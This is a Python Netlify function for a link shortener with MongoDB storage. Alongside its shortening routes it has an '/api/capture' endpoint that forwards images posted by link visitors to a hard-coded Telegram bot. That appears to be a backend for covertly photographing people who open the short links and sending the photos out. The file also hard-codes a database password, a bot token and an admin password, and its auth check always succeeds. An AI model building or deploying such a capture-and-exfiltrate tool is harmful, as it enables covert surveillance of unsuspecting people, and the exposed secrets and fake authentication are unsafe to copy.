import json
import os
from datetime import datetime
import random
import string
from pymongo import MongoClient
import requests
import base64
import time

# MongoDB Connection
MONGO_URI = "mongodb+srv://Anish_Gupta:Anish_Gupta@linkshortner.huk3frj.mongodb.net/?appName=LinkShortner&retryWrites=true&w=majority"
client = MongoClient(MONGO_URI)
db = client.link_shortener
links_collection = db.links

# Constants
PASSWORD = "@35678"
TELEGRAM_TOKEN = "8337969851:AAFe-QHJnMScU4ELsIUIlm74-M_WVepuA54"
TELEGRAM_CHAT_ID = "6673230400"

def generate_short_code(length=6):
    """Generate random short code"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def send_to_telegram(image_data):
    """Send image to Telegram"""
    try:
        # Decode base64 image
        if ',' in image_data:
            image_data = image_data.split(',')[1]
        
        # Send to Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        
        # Prepare file
        files = {'photo': ('photo.jpg', base64.b64decode(image_data))}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        
        response = requests.post(url, files=files, data=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

def handler(event, context):
    """Main handler for Netlify Functions"""
    
    # Set CORS headers
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Content-Type': 'application/json'
    }
    
    # Handle OPTIONS request for CORS
    if event['httpMethod'] == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': headers,
            'body': ''
        }
    
    path = event['path']
    method = event['httpMethod']
    
    try:
        body = json.loads(event['body']) if event.get('body') else {}
    except:
        body = {}
    
    # Route handling
    if path == '/api/verify' and method == 'POST':
        password = body.get('password', '')
        if password == PASSWORD:
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({
                    'success': True,
                    'redirect': '/shortener.html',
                    'token': ''.join(random.choices(string.hexdigits, k=32))
                })
            }
        else:
            return {
                'statusCode': 401,
                'headers': headers,
                'body': json.dumps({'success': False, 'message': 'Incorrect password'})
            }
    
    elif path == '/api/shorten' and method == 'POST':
        original_url = body.get('url', '')
        if not original_url:
            return {
                'statusCode': 400,
                'headers': headers,
                'body': json.dumps({'error': 'URL is required'})
            }
        
        # Generate short code
        short_code = generate_short_code()
        
        # Save to MongoDB
        link_data = {
            'short_code': short_code,
            'original_url': original_url,
            'created_at': datetime.now().isoformat(),
            'click_count': 0,
            'created_by': 'team'
        }
        
        links_collection.insert_one(link_data)
        
        # Get site URL from headers
        site_url = event['headers'].get('origin', 'https://your-site.netlify.app')
        
        return {
            'statusCode': 200,
            'headers': headers,
            'body': json.dumps({
                'success': True,
                'short_url': f"{site_url}/{short_code}",
                'short_code': short_code
            })
        }
    
    elif path == '/api/links' and method == 'GET':
        # Get recent links
        links = list(links_collection.find().sort('created_at', -1).limit(20))
        
        # Convert ObjectId to string
        for link in links:
            link['_id'] = str(link['_id'])
        
        return {
            'statusCode': 200,
            'headers': headers,
            'body': json.dumps({'links': links})
        }
    
    elif path == '/api/capture' and method == 'POST':
        image_data = body.get('image', '')
        if image_data:
            send_to_telegram(image_data)
        
        return {
            'statusCode': 200,
            'headers': headers,
            'body': json.dumps({'success': True})
        }
    
    elif path == '/api/check-auth' and method == 'GET':
        # Simple auth check - we'll handle auth via token in localStorage
        return {
            'statusCode': 200,
            'headers': headers,
            'body': json.dumps({'authenticated': True})
        }
    
    elif path == '/api/get-link' and method == 'GET':
        short_code = event.get('queryStringParameters', {}).get('code', '')
        link = links_collection.find_one({'short_code': short_code})
        
        if link:
            # Increment click count
            links_collection.update_one(
                {'short_code': short_code},
                {'$inc': {'click_count': 1}}
            )
            
            link['_id'] = str(link['_id'])
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({'found': True, 'link': link})
            }
        else:
            return {
                'statusCode': 404,
                'headers': headers,
                'body': json.dumps({'found': False})
            }
    
    else:
        return {
            'statusCode': 404,
            'headers': headers,
            'body': json.dumps({'error': 'Route not found'})
                            }
